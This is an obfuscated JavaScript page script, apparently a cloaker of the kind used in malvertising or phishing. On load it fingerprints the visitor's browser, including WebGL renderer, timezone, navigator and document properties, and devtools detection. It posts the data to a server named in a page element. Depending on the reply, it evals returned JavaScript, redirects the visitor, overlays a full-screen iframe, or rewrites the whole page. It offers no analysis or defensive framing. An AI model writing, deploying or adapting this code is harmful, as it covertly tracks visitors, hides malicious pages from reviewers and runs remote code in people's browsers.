window._adata = {
    "action": "js",
    "target": "console.log(\"BOT!!!\");",
    "js": false,
    "ok": false,
    "cid": "4cb2bdd5e1b96a87d439f65ad57e9039"
};

function _0x3491(_0x680637, _0x532ac7) {
    var _0x494cb1 = _0x494c();
    return _0x3491 = function (_0x34918b, _0x3f6368) {
            _0x34918b = _0x34918b - 0xeb;
            var _0x483469 = _0x494cb1[_0x34918b];
            return _0x483469;
        },
        _0x3491(_0x680637, _0x532ac7);
}

function _0x494c() {
    var _0x2754c0 = ['window', 'attributes', 'parse', 'getParameter', 'target', 'push', 'includes', 'toString', 'function', 'iframe', 'getOwnPropertyNames', 'errors', 'status', 'refresh', 'WEBGL_debug_renderer_info', '_adata', 'GET', 'stringify', 'open', 'proxy', 'video', '4182948dnkTcq', 'src', 'TouchEvent', '5516904xPpkgB', 'touchEvent', 'video/mp4', 'proto', 'local', 'UNMASKED_VENDOR_WEBGL', 'style', 'readyState', 'screen', '5323219OrhwrP', 'tostring', 'cid', 'fetch', 'xsf', '908320bpMwNc', 'documentElement', 'write', '65662eCEvtq', 'getExtension', 'append', '10sUiEzY', 'getAttribute', 'close', '111bWcgBU', 'xar', 'action', 'origin', 'webgl', 'POST', 'location', 'message', 'prototype', 'createEvent', 'send', 'createElement', '104083dGDryO', 'document', 'nodeName', '336coHcIs', '377944QlAPQD', 'object', '303', 'replace', 'console', 'responseText', 'UNMASKED_RENDERER_WEBGL', 'log', '60SRHebu'];
    _0x494c = function () {
        return _0x2754c0;
    };
    return _0x494c();
}

(function (_0x34ebd0, _0x28be55) {
        var _0x339d0c = _0x3491,
            _0x342ca3 = _0x34ebd0();
        while (true) {
            try {
                var _0x2cd347 = parseInt(_0x339d0c(0x122)) / 0x1 + parseInt(_0x339d0c(0x125)) / 0x2 * (-parseInt(_0x339d0c(0x12b)) / 0x3) + parseInt(_0x339d0c(0xf3)) / 0x4 * (parseInt(_0x339d0c(0xfb)) / 0x5) + -parseInt(_0x339d0c(0xf2)) / 0x6 * (parseInt(_0x339d0c(0xef)) / 0x7) + parseInt(_0x339d0c(0x114)) / 0x8 + parseInt(_0x339d0c(0x111)) / 0x9 + -parseInt(_0x339d0c(0x128)) / 0xa * (parseInt(_0x339d0c(0x11d)) / 0xb);
                if (_0x2cd347 === _0x28be55)
                    break;
                else
                    _0x342ca3.push(_0x342ca3.shift());
            } catch (_0x42f300) {
                _0x342ca3.push(_0x342ca3.shift());
            }
        }
    }(_0x494c, 0xa266d),


    (function () {
        var _0x568e5f = _0x3491,
            _0x58ff2f = [],
            _0x216676 = {},
            _0x2b266b = document.getElementById(btoa(window.location.origin));

        function _0x402b30(adata) {
            var _0x38c9da = _0x568e5f;
            if (adata.ok)
                switch (adata.action) {
                case 'local':
                case 'fetch':
                    var req = new XMLHttpRequest();
                    req.open('GET', adata.target, false),
                        req.onreadystatechange = function () {
                            4 === this.readyState && 200 === this.status && (document.open(),
                                document.write(this.responseText),
                                document.close());
                        },
                        req.send();
                    break;
                case 'proxy':
                case '301':
                case '302':
                case '303':
                case 'refresh':
                case 'meta':
                case 'xar':
                case 'xsf':
                    window.location.replace(adata.target);
                    break;
                case 'iframe':
                    var iframe = document.createElement('iframe'),
                        iframe.style.cssText = 'width:100%;height:100%;position:absolute;top:0;left:0;z-index:999999;border:none;',
                        iframe.src = adata.target,
                        adata.target = iframe.outerHTML;
                case 'php':
                    document.open(),
                        document.write(adata.target),
                        document.close();
                    break;
                case 'js':
                    eval(adata.target);
                }
        }
        var window_adata = window._adata;
        if (!window_adata.js)
            return _0x402b30(window_adata);
        try {
            function _0x45fff6(_0x44e9c2) {
                var _0xcffb74 = _0x568e5f;
                if ('object' === typeof _0x44e9c2 && null !== _0x44e9c2) {
                    var _0x29d166 = {};

                    function _0x462554(_0x56f462) {
                        var _0x104805 = _0x3491;
                        try {
                            var _0x5ac32e = _0x44e9c2[_0x56f462];
                            switch (typeof _0x5ac32e) {
                            case 'object':
                                if (null === _0x5ac32e)
                                    break;
                            case 'function':
                                _0x5ac32e = _0x5ac32e.toString();
                            }
                            _0x29d166[_0x56f462] = _0x5ac32e;
                        } catch (_0x207372) {
                            _0x58ff2f.push(_0x207372.message);
                        }
                    }
                    for (var _0x1a70af in _0x44e9c2)
                        _0x462554(_0x1a70af);
                    try {
                        var _0xb5f0bb = Object.getOwnPropertyNames(_0x44e9c2);
                        for (_0x1a70af = 0x0; _0x1a70af < _0xb5f0bb.length; ++_0x1a70af)
                            _0x462554(_0xb5f0bb[_0x1a70af]);
                        _0x29d166['!!'] = _0xb5f0bb;
                    } catch (_0x13b1cf) {
                        _0x58ff2f.push(_0x13b1cf.message);
                    }
                    return _0x29d166;
                }
            }
            _0x216676.screen = _0x45fff6(window.screen),
                _0x216676.window = _0x45fff6(window),
                _0x216676.navigator = _0x45fff6(window.navigator),
                _0x216676.location = _0x45fff6(window.location),
                _0x216676.console = _0x45fff6(window.console),
                _0x216676.documentElement = function (_0x467130) {
                    try {
                        var _0x307e2a = {};
                        _0x467130 = _0x467130.attributes;
                        for (var _0x5a253e in _0x467130)
                            _0x5a253e = _0x467130[_0x5a253e],
                            _0x307e2a[_0x5a253e.nodeName] = _0x5a253e.nodeValue;
                        return _0x307e2a;
                    } catch (_0x82c654) {
                        _0x58ff2f.push(_0x82c654.message);
                    }
                }(document.documentElement),
                _0x216676.document = _0x45fff6(document);
            try {
                _0x216676.timezoneOffset = new Date().getTimezoneOffset();
            } catch (_0x16f274) {
                _0x58ff2f.push(_0x16f274.message);
            }
            try {
                _0x216676.closure = function () {}
                    ['toString']();
            } catch (_0x1a6ac7) {
                _0x58ff2f.push(_0x1a6ac7.message);
            }
            try {
                _0x216676.touchEvent = document.createEvent('TouchEvent').toString();
            } catch (_0x546942) {
                _0x58ff2f.push(_0x546942.message);
            }
            try {
                var _0x412346 = function () {},
                    _0x14195a = 0x0;
                _0x412346.toString = function () {
                        return ++_0x14195a,
                            '';
                    },
                    console.log(_0x412346),
                    _0x216676.tostring = _0x14195a;
            } catch (_0x1ba528) {
                _0x58ff2f.push(_0x1ba528.message);
            }
            try {
                var _0x67ff06 = document.createElement('canvas').getContext('webgl'),
                    _0x268d69 = _0x67ff06.getExtension('WEBGL_debug_renderer_info');
                _0x216676.webgl = {
                    'vendor': _0x67ff06.getParameter(_0x268d69.UNMASKED_VENDOR_WEBGL),
                    'renderer': _0x67ff06.getParameter(_0x268d69.UNMASKED_RENDERER_WEBGL)
                };
            } catch (_0x2d380c) {
                _0x58ff2f.push(_0x2d380c.message);
            }

            function _0x5489c4(_0x3cb346, _0x40f5e7, _0x41f0e6) {
                var _0x19c2cf = _0x568e5f,
                    _0x25a9b0 = _0x3cb346.prototype[_0x40f5e7];
                _0x3cb346.prototype[_0x40f5e7] = function () {
                        _0x216676.proto = true;
                    },
                    _0x41f0e6(),
                    _0x3cb346.prototype[_0x40f5e7] = _0x25a9b0;
            }
            try {
                _0x5489c4(Array, 'includes', function () {
                    return document.createElement('video').canPlayType('video/mp4');
                });
            } catch (_0x6f93bd) {}
        } catch (_0x3cee57) {
            _0x58ff2f.push(_0x3cee57.message);
        }
        (function () {
            _0x216676.errors = _0x58ff2f,
                _0x216676.cid = window_adata.cid;
            var _0x54f6da = new FormData();
            _0x54f6da.append('data', JSON.stringify(_0x216676));
            var _0x283c8b = new XMLHttpRequest();
            _0x283c8b.open('POST', _0x2b266b.getAttribute('src'), false),
                _0x283c8b.onreadystatechange = function () {
                    4 === this.readyState && 200 === this.status && _0x402b30(JSON.parse(this.responseText));
                },
                _0x283c8b.send(_0x54f6da);
        }());
    }()));